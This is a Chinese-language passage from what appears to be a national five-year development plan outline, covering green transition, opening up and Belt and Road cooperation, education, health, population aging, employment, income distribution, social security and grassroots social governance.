建立地上地下、陆海统筹的生态环境治理制度。全面实行排污许可制，实现所有固定污染源排污许可证核发，推动工业污染源限期达标排放，推进排污权、用能权、用水权、碳排放权市场化交易。完善环境保护、节能减排约束性指标管理。完善河湖管理保护机制，强化河长制、湖长制。加强领导干部自然资源资产离任审计。完善中央生态环境保护督察制度。完善省以下生态环境机构监测监察执法垂直管理制度，推进生态环境保护综合执法改革，完善生态环境公益诉讼制度。加大环保信息公开力度，加强企业环境治理责任制度建设，完善公众监督和举报反馈机制，引导社会组织和公众共同参与环境治理。 第三十九章 加快发展方式绿色转型 坚持生态优先、绿色发展，推进资源总量管理、科学配置、全面节约、循环利用，协同推进经济高质量发展和生态环境高水平保护。 第一节 全面提高资源利用效率 坚持节能优先方针，深化工业、建筑、交通等领域和公共机构节能，推动5G、大数据中心等新兴领域能效提升，强化重点用能单位节能管理，实施能量系统优化、节能技术改造等重点工程，加快能耗限额、产品设备能效强制性国家标准制修订。实施国家节水行动，建立水资源刚性约束制度，强化农业节水增效、工业节水减排和城镇节水降损，鼓励再生水利用，单位GDP用水量下降16%左右。加强土地节约集约利用，加大批而未供和闲置土地处置力度，盘活城镇低效用地，支持工矿废弃土地恢复利用，完善土地复合利用、立体开发支持政策，新增建设用地规模控制在2950万亩以内，推动单位GDP建设用地使用面积稳步下降。提高矿产资源开发保护水平，发展绿色矿业，建设绿色矿山。 第二节 构建资源循环利用体系 全面推行循环经济理念，构建多层次资源高效循环利用体系。深入推进园区循环化改造，补齐和延伸产业链，推进能源资源梯级利用、废物循环利用和污染物集中处置。加强大宗固体废弃物综合利用，规范发展再制造产业。加快发展种养有机结合的循环农业。加强废旧物品回收设施规划建设，完善城市废旧物品回收分拣体系。推行生产企业“逆向回收”等模式，建立健全线上线下融合、流向可控的资源回收体系。拓展生产者责任延伸制度覆盖范围。推进快递包装减量化、标准化、循环化。 第三节 大力发展绿色经济 坚决遏制高耗能、高排放项目盲目发展，推动绿色转型实现积极发展。壮大节能环保、清洁生产、清洁能源、生态环境、基础设施绿色升级、绿色服务等产业，推广合同能源管理、合同节水管理、环境污染第三方治理等服务模式。推动煤炭等化石能源清洁高效利用，推进钢铁、石化、建材等行业绿色化改造，加快大宗货物和中长途货物运输“公转铁”、“公转水”。推动城市公交和物流配送车辆电动化。构建市场导向的绿色技术创新体系，实施绿色技术创新攻关行动，开展重点行业和重点产品资源效率对标提升行动。建立统一的绿色产品标准、认证、标识体系，完善节能家电、高效照明产品、节水器具推广机制。深入开展绿色生活创建行动。 第四节 构建绿色发展政策体系 强化绿色发展的法律和政策保障。实施有利于节能环保和资源综合利用的税收政策。大力发展绿色金融。健全自然资源有偿使用制度，创新完善自然资源、污水垃圾处理、用水用能等领域价格形成机制。推进固定资产投资项目节能审查、节能监察、重点用能单位管理制度改革。完善能效、水效“领跑者”制度。强化高耗水行业用水定额管理。深化生态文明试验区建设。深入推进山西国家资源型经济转型综合配套改革试验区建设和能源革命综合改革试点。 第十二篇 实行高水平对外开放 开拓合作共赢新局面 坚持实施更大范围、更宽领域、更深层次对外开放，依托我国超大规模市场优势，促进国际合作，实现互利共赢，推动共建“一带一路”行稳致远，推动构建人类命运共同体。 第四十章 建设更高水平开放型经济新体制 全面提高对外开放水平，推进贸易和投资自由化便利化，持续深化商品和要素流动型开放，稳步拓展规则、规制、管理、标准等制度型开放。 第一节 加快推进制度型开放 构建与国际通行规则相衔接的制度体系和监管模式。健全外商投资准入前国民待遇加负面清单管理制度，进一步缩减外资准入负面清单，落实准入后国民待遇，促进内外资企业公平竞争。建立健全跨境服务贸易负面清单管理制度，健全技术贸易促进体系。稳妥推进银行、证券、保险、基金、期货等金融领域开放，深化境内外资本市场互联互通，健全合格境外投资者制度。稳慎推进人民币国际化，坚持市场驱动和企业自主选择，营造以人民币自由使用为基础的新型互利合作关系。完善出入境、海关、外汇、税收等环节管理服务。 第二节 提升对外开放平台功能 统筹推进各类开放平台建设，打造开放层次更高、营商环境更优、辐射作用更强的开放新高地。完善自由贸易试验区布局，赋予其更大改革自主权，深化首创性、集成化、差别化改革探索，积极复制推广制度创新成果。稳步推进海南自由贸易港建设，以货物贸易“零关税”、服务贸易“既准入又准营”为方向推进贸易自由化便利化，大幅放宽市场准入，全面推行“极简审批”投资制度，开展跨境证券投融资改革试点和数据跨境传输安全管理试点，实施更加开放的人才、出入境、运输等政策，制定出台海南自由贸易港法，初步建立中国特色自由贸易港政策和制度体系。创新提升国家级新区和开发区，促进综合保税区高水平开放，完善沿边重点开发开放试验区、边境经济合作区、跨境经济合作区功能，支持宁夏、贵州、江西建设内陆开放型经济试验区。 第三节 优化区域开放布局 鼓励各地立足比较优势扩大开放，强化区域间开放联动，构建陆海内外联动、东西双向互济的开放格局。巩固东部沿海地区和超大特大城市开放先导地位，率先推动全方位高水平开放。加快中西部和东北地区开放步伐，支持承接国内外产业转移，培育全球重要加工制造基地和新增长极，研究在内陆地区增设国家一类口岸，助推内陆地区成为开放前沿。推动沿边开发开放高质量发展，加快边境贸易创新发展，更好发挥重点口岸和边境城市内外联通作用。支持广西建设面向东盟的开放合作高地、云南建设面向南亚东南亚和环印度洋地区开放的辐射中心。 第四节 健全开放安全保障体系 构筑与更高水平开放相匹配的监管和风险防控体系。健全产业损害预警体系，丰富贸易调整援助、贸易救济等政策工具，妥善应对经贸摩擦。健全外商投资国家安全审查、反垄断审查和国家技术安全清单管理、不可靠实体清单等制度。建立重要资源和产品全球供应链风险预警系统，加强国际供应链保障合作。加强国际收支监测，保持国际收支基本平衡和外汇储备基本稳定。加强对外资产负债监测，建立健全全口径外债监管体系。完善境外投资分类分级监管体系。构建海外利益保护和风险预警防范体系。优化提升驻外外交机构基础设施保障能力，完善领事保护工作体制机制，维护海外中国公民、机构安全和正当权益。 第四十一章 推动共建“一带一路”高质量发展 坚持共商共建共享原则，秉持绿色、开放、廉洁理念，深化务实合作，加强安全保障，促进共同发展。 第一节 加强发展战略和政策对接 推进战略、规划、机制对接，加强政策、规则、标准联通。创新对接方式，推进已签文件落实见效，推动与更多国家商签投资保护协定、避免双重征税协定等，加强海关、税收、监管等合作，推动实施更高水平的通关一体化。拓展规则对接领域，加强融资、贸易、能源、数字信息、农业等领域规则对接合作。促进共建“一带一路”倡议同区域和国际发展议程有效对接、协同增效。 第二节 推进基础设施互联互通 推动陆海天网四位一体联通，以“六廊六路多国多港”为基本框架，构建以新亚欧大陆桥等经济走廊为引领，以中欧班列、陆海新通道等大通道和信息高速路为骨架，以铁路、港口、管网等为依托的互联互通网络，打造国际陆海贸易新通道。聚焦关键通道和关键城市，有序推动重大合作项目建设，将高质量、可持续、抗风险、价格合理、包容可及目标融入项目建设全过程。提高中欧班列开行质量，推动国际陆运贸易规则制定。扩大“丝路海运”品牌影响。推进福建、新疆建设“一带一路”核心区。推进“一带一路”空间信息走廊建设。建设“空中丝绸之路”。 第三节 深化经贸投资务实合作 推动与共建“一带一路”国家贸易投资合作优化升级，积极发展丝路电商。深化国际产能合作，拓展第三方市场合作，构筑互利共赢的产业链供应链合作体系，扩大双向贸易和投资。坚持以企业为主体、市场为导向，遵循国际惯例和债务可持续原则，健全多元化投融资体系。创新融资合作框架，发挥共建“一带一路”专项贷款、丝路基金等作用。建立健全“一带一路”金融合作网络，推动金融基础设施互联互通，支持多边和各国金融机构共同参与投融资。完善“一带一路”风险防控和安全保障体系，强化法律服务保障，有效防范化解各类风险。 第四节 架设文明互学互鉴桥梁 深化公共卫生、数字经济、绿色发展、科技教育、文化艺术等领域人文合作，加强议会、政党、民间组织往来，密切妇女、青年、残疾人等群体交流，形成多元互动的人文交流格局。推进实施共建“一带一路”科技创新行动计划，建设数字丝绸之路、创新丝绸之路。加强应对气候变化、海洋合作、野生动物保护、荒漠化防治等交流合作，推动建设绿色丝绸之路。积极与共建“一带一路”国家开展医疗卫生和传染病防控合作，建设健康丝绸之路。 第四十二章 积极参与全球治理体系改革和建设 高举和平、发展、合作、共赢旗帜，坚持独立自主的和平外交政策，推动构建新型国际关系，推动全球治理体系朝着更加公正合理的方向发展。 第一节 维护和完善多边经济治理机制 维护多边贸易体制，积极参与世界贸易组织改革，坚决维护发展中成员地位。推动二十国集团等发挥国际经济合作功能，建设性参与亚太经合组织、金砖国家等机制经济治理合作，提出更多中国倡议、中国方案。推动主要多边金融机构深化治理改革，支持亚洲基础设施投资银行和新开发银行更好发挥作用，提高参与国际金融治理能力。推动国际宏观经济政策沟通协调，搭建国际合作平台，共同维护全球产业链供应链稳定畅通、全球金融市场稳定，合力促进世界经济增长。推动新兴领域经济治理规则制定。 第二节 构建高标准自由贸易区网络 实施自由贸易区提升战略，构建面向全球的高标准自由贸易区网络。优化自由贸易区布局，推动区域全面经济伙伴关系协定实施，加快中日韩自由贸易协定谈判进程，稳步推进亚太自贸区建设。提升自由贸易区建设水平，积极考虑加入全面与进步跨太平洋伙伴关系协定，推动商签更多高标准自由贸易协定和区域贸易协定。 第三节 积极营造良好外部环境 积极发展全球伙伴关系，推进大国协调和合作，深化同周边国家关系，加强同发展中国家团结合作。坚持多边主义和共商共建共享原则，维护以联合国为核心的国际体系和以国际法为基础的国际秩序，共同应对全球性挑战。积极参与重大传染病防控国际合作，推动构建人类卫生健康共同体。深化对外援助体制机制改革，优化对外援助布局，向发展中国家特别是最不发达国家提供力所能及的帮助，加强医疗卫生、科技教育、绿色发展、减贫、人力资源开发、紧急人道主义等领域对外合作和援助。积极落实联合国2030年可持续发展议程。 第十三篇 提升国民素质 促进人的全面发展 把提升国民素质放在突出重要位置，构建高质量的教育体系和全方位全周期的健康体系，优化人口结构，拓展人口质量红利，提升人力资本水平和人的全面发展能力。 第四十三章 建设高质量教育体系 全面贯彻党的教育方针，坚持优先发展教育事业，坚持立德树人，增强学生文明素养、社会责任意识、实践本领，培养德智体美劳全面发展的社会主义建设者和接班人。 第一节 推进基本公共教育均等化 巩固义务教育基本均衡成果，完善办学标准，推动义务教育优质均衡发展和城乡一体化。加快城镇学校扩容增位，保障农业转移人口随迁子女平等享有基本公共教育服务。改善乡村小规模学校和乡镇寄宿制学校条件，加强乡村教师队伍建设，提高乡村教师素质能力，完善留守儿童关爱体系，巩固义务教育控辍保学成果。巩固提升高中阶段教育普及水平，鼓励高中阶段学校多样化发展，高中阶段教育毛入学率提高到92%以上。规范校外培训。完善普惠性学前教育和特殊教育、专门教育保障机制，学前教育毛入园率提高到90%以上。提高民族地区教育质量和水平，加大国家通用语言文字推广力度。 第二节 增强职业技术教育适应性 突出职业技术（技工）教育类型特色，深入推进改革创新，优化结构与布局，大力培养技术技能人才。完善职业技术教育国家标准，推行“学历证书+职业技能等级证书”制度。创新办学模式，深化产教融合、校企合作，鼓励企业举办高质量职业技术教育，探索中国特色学徒制。实施现代职业技术教育质量提升计划，建设一批高水平职业技术院校和专业，稳步发展职业本科教育。深化职普融通，实现职业技术教育与普通教育双向互认、纵向流动。 第三节 提高高等教育质量 推进高等教育分类管理和高等学校综合改革，构建更加多元的高等教育体系，高等教育毛入学率提高到60%。分类建设一流大学和一流学科，支持发展高水平研究型大学。建设高质量本科教育，推进部分普通本科高校向应用型转变。建立学科专业动态调整机制和特色发展引导机制，增强高校学科设置针对性，推进基础学科高层次人才培养模式改革，加快培养理工农医类专业紧缺人才。加强研究生培养管理，提升研究生教育质量，稳步扩大专业学位研究生规模。优化区域高等教育资源布局，推进中西部地区高等教育振兴。 第四节 建设高素质专业化教师队伍 建立高水平现代教师教育体系，加强师德师风建设，完善教师管理和发展政策体系，提升教师教书育人能力素质。重点建设一批师范教育基地，支持高水平综合大学开展教师教育，健全师范生公费教育制度，推进教育类研究生和公费师范生免试认定教师资格改革。支持高水平工科大学举办职业技术师范专业，建立高等学校、职业学校与行业企业联合培养“双师型”教师机制。深化中小学、幼儿园教师管理综合改革，统筹教师编制配置和跨区调整，推进义务教育教师“县管校聘”管理改革，适当提高中高级教师岗位比例。 第五节 深化教育改革 深化新时代教育评价改革，建立健全教育评价制度和机制，发展素质教育，更加注重学生爱国情怀、创新精神和健康人格培养。坚持教育公益性原则，加大教育经费投入，改革完善经费使用管理制度，提高经费使用效益。落实和扩大学校办学自主权，完善学校内部治理结构，有序引导社会参与学校治理。深化考试招生综合改革。支持和规范民办教育发展，开展高水平中外合作办学。发挥在线教育优势，完善终身学习体系，建设学习型社会。推进高水平大学开放教育资源，完善注册学习和弹性学习制度，畅通不同类型学习成果的互认和转换渠道。 第四十四章 全面推进健康中国建设 把保障人民健康放在优先发展的战略位置，坚持预防为主的方针，深入实施健康中国行动，完善国民健康促进政策，织牢国家公共卫生防护网，为人民提供全方位全生命期健康服务。 第一节 构建强大公共卫生体系 改革疾病预防控制体系，强化监测预警、风险评估、流行病学调查、检验检测、应急处置等职能。建立稳定的公共卫生事业投入机制，改善疾控基础条件，强化基层公共卫生体系。落实医疗机构公共卫生责任，创新医防协同机制。完善突发公共卫生事件监测预警处置机制，加强实验室检测网络建设，健全医疗救治、科技支撑、物资保障体系，提高应对突发公共卫生事件能力。建立分级分层分流的传染病救治网络，建立健全统一的国家公共卫生应急物资储备体系，大型公共建筑预设平疫结合改造接口。筑牢口岸防疫防线。加强公共卫生学院和人才队伍建设。完善公共卫生服务项目，扩大国家免疫规划，强化慢性病预防、早期筛查和综合干预。完善心理健康和精神卫生服务体系。 第二节 深化医药卫生体制改革 坚持基本医疗卫生事业公益属性，以提高医疗质量和效率为导向，以公立医疗机构为主体、非公立医疗机构为补充，扩大医疗服务资源供给。加强公立医院建设，加快建立现代医院管理制度，深入推进治理结构、人事薪酬、编制管理和绩效考核改革。加快优质医疗资源扩容和区域均衡布局，建设国家医学中心和区域医疗中心。加强基层医疗卫生队伍建设，以城市社区和农村基层、边境口岸城市、县级医院为重点，完善城乡医疗服务网络。加快建设分级诊疗体系，积极发展医疗联合体。加强预防、治疗、护理、康复有机衔接。推进国家组织药品和耗材集中带量采购使用改革，发展高端医疗设备。完善创新药物、疫苗、医疗器械等快速审评审批机制，加快临床急需和罕见病治疗药品、医疗器械审评审批，促进临床急需境外已上市新药和医疗器械尽快在境内上市。提升医护人员培养质量与规模，扩大儿科、全科等短缺医师规模，每千人口拥有注册护士数提高到3.8人。实施医师区域注册，推动医师多机构执业。稳步扩大城乡家庭医生签约服务覆盖范围，提高签约服务质量。支持社会办医，鼓励有经验的执业医师开办诊所。 第三节 健全全民医保制度 健全基本医疗保险稳定可持续筹资和待遇调整机制，完善医保缴费参保政策，实行医疗保障待遇清单制度。做实基本医疗保险市级统筹，推动省级统筹。完善基本医疗保险门诊共济保障机制，健全重大疾病医疗保险和救助制度。完善医保目录动态调整机制。推行以按病种付费为主的多元复合式医保支付方式。将符合条件的互联网医疗服务纳入医保支付范围，落实异地就医结算。扎实推进医保标准化、信息化建设，提升经办服务水平。健全医保基金监管机制。稳步建立长期护理保险制度。积极发展商业医疗保险。 第四节 推动中医药传承创新 坚持中西医并重和优势互补，大力发展中医药事业。健全中医药服务体系，发挥中医药在疾病预防、治疗、康复中的独特优势。加强中西医结合，促进少数民族医药发展。加强古典医籍精华的梳理和挖掘，建设中医药科技支撑平台，改革完善中药审评审批机制，促进中药新药研发保护和产业发展。强化中药质量监管，促进中药质量提升。强化中医药特色人才培养，加强中医药文化传承与创新发展，推动中医药走向世界。 第五节 建设体育强国 广泛开展全民健身运动，增强人民体质。推动健康关口前移，深化体教融合、体卫融合、体旅融合。完善全民健身公共服务体系，推进社会体育场地设施建设和学校场馆开放共享，提高健身步道等便民健身场所覆盖面，因地制宜发展体育公园，支持在不妨碍防洪安全前提下利用河滩地等建设公共体育设施。保障学校体育课和课外锻炼时间，以青少年为重点开展国民体质监测和干预。坚持文化教育和专业训练并重，加强竞技体育后备人才培养，提升重点项目竞技水平，巩固传统项目优势，探索中国特色足球篮球排球发展路径，持续推进冰雪运动发展，发展具有世界影响力的职业体育赛事。扩大体育消费，发展健身休闲、户外运动等体育产业。办好北京冬奥会、冬残奥会及杭州亚运会等。 第六节 深入开展爱国卫生运动 丰富爱国卫生工作内涵，促进全民养成文明健康生活方式。加强公共卫生环境基础设施建设，推进城乡环境卫生整治，强化病媒生物防制。深入推进卫生城镇创建。加强健康教育和健康知识普及，树立良好饮食风尚，制止餐饮浪费行为，开展控烟限酒行动，坚决革除滥食野生动物等陋习，推广分餐公筷、垃圾分类投放等生活习惯。 第四十五章 实施积极应对人口老龄化国家战略 制定人口长期发展战略，优化生育政策，以“一老一小”为重点完善人口服务体系，促进人口长期均衡发展。 第一节 推动实现适度生育水平 增强生育政策包容性，推动生育政策与经济社会政策配套衔接，减轻家庭生育、养育、教育负担，释放生育政策潜力。完善幼儿养育、青少年发展、老人赡养、病残照料等政策和产假制度，探索实施父母育儿假。改善优生优育全程服务，加强孕前孕产期健康服务，提高出生人口质量。建立健全计划生育特殊困难家庭全方位帮扶保障制度。改革完善人口统计和监测体系，密切监测生育形势。深化人口发展战略研究，健全人口与发展综合决策机制。 第二节 健全婴幼儿发展政策 发展普惠托育服务体系，健全支持婴幼儿照护服务和早期发展的政策体系。加强对家庭照护和社区服务的支持指导，增强家庭科学育儿能力。严格落实城镇小区配套园政策，积极发展多种形式的婴幼儿照护服务机构，鼓励有条件的用人单位提供婴幼儿照护服务，支持企事业单位和社会组织等社会力量提供普惠托育服务，鼓励幼儿园发展托幼一体化服务。推进婴幼儿照护服务专业化、规范化发展，提高保育保教质量和水平。 第三节 完善养老服务体系 推动养老事业和养老产业协同发展，健全基本养老服务体系，大力发展普惠型养老服务，支持家庭承担养老功能，构建居家社区机构相协调、医养康养相结合的养老服务体系。完善社区居家养老服务网络，推进公共设施适老化改造，推动专业机构服务向社区延伸，整合利用存量资源发展社区嵌入式养老。强化对失能、部分失能特困老年人的兜底保障，积极发展农村互助幸福院等互助性养老。深化公办养老机构改革，提升服务能力和水平，完善公建民营管理机制，支持培训疗养资源转型发展养老，加强对护理型民办养老机构的政策扶持，开展普惠养老城企联动专项行动。加强老年健康服务，深入推进医养康养结合。加大养老护理型人才培养力度，扩大养老机构护理型床位供给，养老机构护理型床位占比提高到55%，更好满足高龄失能失智老年人护理服务需求。逐步提升老年人福利水平，完善经济困难高龄失能老年人补贴制度和特殊困难失能留守老年人探访关爱制度。健全养老服务综合监管制度。构建养老、孝老、敬老的社会环境，强化老年人权益保障。综合考虑人均预期寿命提高、人口老龄化趋势加快、受教育年限增加、劳动力结构变化等因素，按照小步调整、弹性实施、分类推进、统筹兼顾等原则，逐步延迟法定退休年龄，促进人力资源充分利用。发展银发经济，开发适老化技术和产品，培育智慧养老等新业态。 第十四篇 增进民生福祉 提升共建共治共享水平 坚持尽力而为、量力而行，健全基本公共服务体系，加强普惠性、基础性、兜底性民生建设，完善共建共治共享的社会治理制度，制定促进共同富裕行动纲要，自觉主动缩小地区、城乡和收入差距，让发展成果更多更公平惠及全体人民，不断增强人民群众获得感、幸福感、安全感。 第四十六章 健全国家公共服务制度体系 加快补齐基本公共服务短板，着力增强非基本公共服务弱项，努力提升公共服务质量和水平。 第一节 提高基本公共服务均等化水平 推动城乡区域基本公共服务制度统一、质量水平有效衔接。围绕公共教育、就业创业、社会保险、医疗卫生、社会服务、住房保障、公共文化体育、优抚安置、残疾人服务等领域，建立健全基本公共服务标准体系，明确国家标准并建立动态调整机制，推动标准水平城乡区域间衔接平衡。按照常住人口规模和服务半径统筹基本公共服务设施布局和共建共享，促进基本公共服务资源向基层延伸、向农村覆盖、向边远地区和生活困难群众倾斜。 第二节 创新公共服务提供方式 区分基本与非基本，突出政府在基本公共服务供给保障中的主体地位，推动非基本公共服务提供主体多元化、提供方式多样化。在育幼、养老等供需矛盾突出的服务领域，支持社会力量扩大普惠性规范性服务供给，保障提供普惠性规范性服务的各类机构平等享受优惠政策。鼓励社会力量通过公建民营、政府购买服务、政府和社会资本合作等方式参与公共服务供给。深化公共服务领域事业单位改革，营造事业单位与社会力量公平竞争的市场环境。 第三节 完善公共服务政策保障体系 优化财政支出结构，优先保障基本公共服务补短板。明确中央和地方在公共服务领域事权和支出责任，加大中央和省级财政对基层政府提供基本公共服务的财力支持。将更多公共服务项目纳入政府购买服务指导性目录，加大政府购买力度，完善财政、融资和土地等优惠政策。在资格准入、职称评定、土地供给、财政支持、政府采购、监督管理等方面公平对待民办与公办机构。 第四十七章 实施就业优先战略 健全有利于更充分更高质量就业的促进机制，扩大就业容量，提升就业质量，缓解结构性就业矛盾。 第一节 强化就业优先政策 坚持经济发展就业导向，健全就业目标责任考核机制和就业影响评估机制。完善高校毕业生、退役军人、农民工等重点群体就业支持体系。完善与就业容量挂钩的产业政策，支持吸纳就业能力强的服务业、中小微企业和劳动密集型企业发展，稳定拓展社区超市、便利店和社区服务岗位。促进平等就业，增加高质量就业，注重发展技能密集型产业，支持和规范发展新就业形态，扩大政府购买基层教育、医疗和专业化社会服务规模。建立促进创业带动就业、多渠道灵活就业机制，全面清理各类限制性政策，增强劳动力市场包容性。统筹城乡就业政策，积极引导农村劳动力就业。扩大公益性岗位安置，着力帮扶残疾人、零就业家庭成员等困难人员就业。 第二节 健全就业公共服务体系 健全覆盖城乡的就业公共服务体系，加强基层公共就业创业服务平台建设，为劳动者和企业免费提供政策咨询、职业介绍、用工指导等服务。构建常态化援企稳岗帮扶机制，统筹用好就业补助资金和失业保险基金。健全劳务输入集中区域与劳务输出省份对接协调机制，加强劳动力跨区域精准对接。加强劳动者权益保障，健全劳动合同制度和劳动关系协调机制，完善欠薪治理长效机制和劳动争议调解仲裁制度，探索建立新业态从业人员劳动权益保障机制。健全就业需求调查和失业监测预警机制。 第三节 全面提升劳动者就业创业能力 健全终身技能培训制度，持续大规模开展职业技能培训。深入实施职业技能提升行动和重点群体专项培训计划，广泛开展新业态新模式从业人员技能培训，有效提高培训质量。统筹各级各类职业技能培训资金，创新使用方式，畅通培训补贴直达企业和培训者渠道。健全培训经费税前扣除政策，鼓励企业开展岗位技能提升培训。支持开展订单式、套餐制培训。建设一批公共实训基地和产教融合基地，推动培训资源共建共享。办好全国职业技能大赛。 第四十八章 优化收入分配结构 坚持居民收入增长和经济增长基本同步、劳动报酬提高和劳动生产率提高基本同步，持续提高低收入群体收入，扩大中等收入群体，更加积极有为地促进共同富裕。 第一节 拓展居民收入增长渠道 坚持按劳分配为主体、多种分配方式并存，提高劳动报酬在初次分配中的比重。健全工资决定、合理增长和支付保障机制，完善最低工资标准和工资指导线形成机制，积极推行工资集体协商制度。完善按要素分配政策制度，健全各类生产要素由市场决定报酬的机制，探索通过土地、资本等要素使用权、收益权增加中低收入群体要素收入。完善国有企业市场化薪酬分配机制，普遍实行全员绩效管理。改革完善体现岗位绩效和分级分类管理的事业单位薪酬制度。规范劳务派遣用工行为，保障劳动者同工同酬。多渠道增加城乡居民财产性收入，提高农民土地增值收益分享比例，完善上市公司分红制度，创新更多适应家庭财富管理需求的金融产品。完善国有资本收益上缴公共财政制度，加大公共财政支出用于民生保障力度。 第二节 扩大中等收入群体 实施扩大中等收入群体行动计划，以高校和职业院校毕业生、技能型劳动者、农民工等为重点，不断提高中等收入群体比重。提高高校、职业院校毕业生就业匹配度和劳动参与率。拓宽技术工人上升通道，畅通非公有制经济组织、社会组织、自由职业专业技术人员职称申报和技能等级认定渠道，提高技能型人才待遇水平和社会地位。实施高素质农民培育计划，运用农业农村资源和现代经营方式增加收入。完善小微创业者扶持政策，支持个体工商户、灵活就业人员等群体勤劳致富。 第三节 完善再分配机制 加大税收、社会保障、转移支付等调节力度和精准性，发挥慈善等第三次分配作用，改善收入和财富分配格局。健全直接税体系，完善综合与分类相结合的个人所得税制度，加强对高收入者的税收调节和监管。增强社会保障待遇和服务的公平性可及性，完善兜底保障标准动态调整机制。规范收入分配秩序，保护合法收入，合理调节过高收入，取缔非法收入，遏制以垄断和不正当竞争行为获取收入。建立完善个人收入和财产信息系统。健全现代支付和收入监测体系。 第四十九章 健全多层次社会保障体系 坚持应保尽保原则，按照兜底线、织密网、建机制的要求，加快健全覆盖全民、统筹城乡、公平统一、可持续的多层次社会保障体系。 第一节 改革完善社会保险制度 健全养老保险制度体系，促进基本养老保险基金长期平衡。实现基本养老保险全国统筹，放宽灵活就业人员参保条件，实现社会保险法定人群全覆盖。完善划转国有资本充实社保基金制度，优化做强社会保障战略储备基金。完善城镇职工基本养老金合理调整机制，逐步提高城乡居民基础养老金标准。发展多层次、多支柱养老保险体系，提高企业年金覆盖率，规范发展第三支柱养老保险。推进失业保险、工伤保险向职业劳动者广覆盖，实现省级统筹。推进社保转移接续，完善全国统一的社会保险公共服务平台。 第二节 优化社会救助和慈善制度 以城乡低保对象、特殊困难人员、低收入家庭为重点，健全分层分类的社会救助体系，构建综合救助格局。健全基本生活救助制度和医疗、教育、住房、就业、受灾人员等专项救助制度，完善救助标准和救助对象动态调整机制。健全临时救助政策措施，强化急难社会救助功能。加强城乡救助体系统筹，逐步实现常住地救助申领。积极发展服务类社会救助，推进政府购买社会救助服务。促进慈善事业发展，完善财税等激励政策。规范发展网络慈善平台，加强彩票和公益金管理。 第三节 健全退役军人工作体系和保障制度 完善退役军人事务组织管理体系、工作运行体系和政策制度体系，提升退役军人服务保障水平。深化退役军人安置制度改革，加大教育培训和就业扶持力度，拓展就业领域，提升安置质量。建立健全新型待遇保障体系，完善和落实优抚政策，合理提高退役军人和其他优抚对象待遇标准，做好随调配偶子女工作安排、落户和教育等工作。完善离退休军人和伤病残退役军人移交安置、收治休养制度，加强退役军人服务中心（站）建设，提升优抚医院、光荣院、军供站等建设服务水平。加强退役军人保险制度衔接。大力弘扬英烈精神，加强烈士纪念设施建设和管护，建设军人公墓。深入推动双拥模范城（县）创建。 第五十章 保障妇女未成年人和残疾人基本权益 坚持男女平等基本国策，坚持儿童优先发展，提升残疾人关爱服务水平，切实保障妇女、未成年人、残疾人等群体发展权利和机会。 第一节 促进男女平等和妇女全面发展 深入实施妇女发展纲要，持续改善妇女发展环境，促进妇女平等依法行使权利、参与经济社会发展、共享发展成果。保障妇女享有卫生健康服务，完善宫颈癌、乳腺癌综合防治体系和救助政策。保障妇女平等享有受教育权利，持续提高受教育年限和综合能力素质。保障妇女平等享有经济权益，消除就业性别歧视，依法享有产假和生育津贴，保障农村妇女土地权益。保障妇女平等享有政治权利，推动妇女广泛参与社会事务和民主管理。落实法规政策性别平等评估机制，完善分性别统计制度。提高留守妇女关爱服务水平。严厉打击侵害妇女和女童人身权利的违法犯罪行为。 第二节 提升未成年人关爱服务水平 深入实施儿童发展纲要，优化儿童发展环境，切实保障儿童生存权、发展权、受保护权和参与权。完善儿童健康服务体系，预防和控制儿童疾病，减少儿童死亡和严重出生缺陷发生，有效控制儿童肥胖和近视，实施学龄前儿童营养改善计划。保障儿童公平受教育权利，加强儿童心理健康教育和服务。加强困境儿童分类保障，完善农村留守儿童关爱服务体系，健全孤儿和事实无人抚养儿童保障机制。完善落实未成年人监护制度，严厉打击侵害未成年人权益的违法犯罪行为，完善未成年人综合保护体系。深入实施青年发展规划，促进青年全面发展，搭建青年成长成才和建功立业的平台，激发青年创新创业活力。 第三节 加强家庭建设 以建设文明家庭、实施科学家教、传承优良家风为重点，深入实施家家幸福安康工程。构建支持家庭发展的法律政策体系，推进家庭教育立法进程，加大反家庭暴力法实施力度，加强婚姻家庭辅导服务，预防和化解婚姻家庭矛盾纠纷。构建覆盖城乡的家庭教育指导服务体系，健全学校家庭社会协同育人机制。促进家庭服务多元化发展。充分发挥家庭家教家风在基层社会治理中的作用。 第四节 提升残疾人保障和发展能力 健全残疾人帮扶制度，帮助残疾人普遍参加基本医疗和基本养老保险，动态调整困难残疾人生活补贴和重度残疾人护理补贴标准。完善残疾人就业支持体系，加强残疾人劳动权益保障，优先为残疾人提供职业技能培训，扶持残疾人自主创业。推进适龄残疾儿童和少年教育全覆盖，提升特殊教育质量。建成康复大学，促进康复服务市场化发展，提高康复辅助器具适配率，提升康复服务质量。开展重度残疾人托养照护服务。加强残疾人服务设施和综合服务能力建设，完善无障碍环境建设和维护政策体系，支持困难残疾人家庭无障碍设施改造。 第五十一章 构建基层社会治理新格局 健全党组织领导的自治、法治、德治相结合的城乡基层社会治理体系，完善基层民主协商制度，建设人人有责、人人尽责、人人享有的社会治理共同体。 第一节 夯实基层社会治理基础 健全党组织领导、村（居）委会主导、人民群众为主体的基层社会治理框架。依法厘清基层政府与基层群众性自治组织的权责边界，制定县（区）职能部门、乡镇（街道）在城乡社区治理方面的权责清单制度，实行工作事项准入制度，减轻基层特别是村级组织负担。加强基层群众性自治组织规范化建设，合理确定其功能、规模和事务范围。加强基层群众自治机制建设，完善村（居）民议事会、理事会、监督委员会等自治载体，健全村（居）民参与社会治理的组织形式和制度化渠道。 第二节 健全社区管理和服务机制 推动社会治理和服务重心下移、资源下沉，提高城乡社区精准化精细化服务管理能力。推进审批权限和公共服务事项向基层延伸，构建网格化管理、精细化服务、信息化支撑、开放共享的基层管理服务平台，推动就业社保、养老托育、扶残助残、医疗卫生、家政服务、物流商超、治安执法、纠纷调处、心理援助等便民服务场景有机集成和精准对接。完善城市社区居委会职能，督促业委会和物业服务企业履行职责，改进社区物业服务管理。构建专职化、专业化的城乡社区工作者队伍。 第三节 积极引导社会力量参与基层治理 发挥群团组织和社会组织在社会治理中的作用，畅通和规范市场主体、新社会阶层、社会工作者和志愿者等参与社会治理的途径，全面激发基层社会治理活力。培育规范化行业协会商会、公益慈善组织、城乡社区社会组织，加强财政补助、购买服务、税收优惠、人才保障等政策支持和事中事后监管。支持和发展社会工作服务机构和志愿服务组织，壮大志愿者队伍，搭建更多志愿服务平台，健全志愿服务体系。 第十五篇 统筹发展和安全 建设更高水平的平安中国 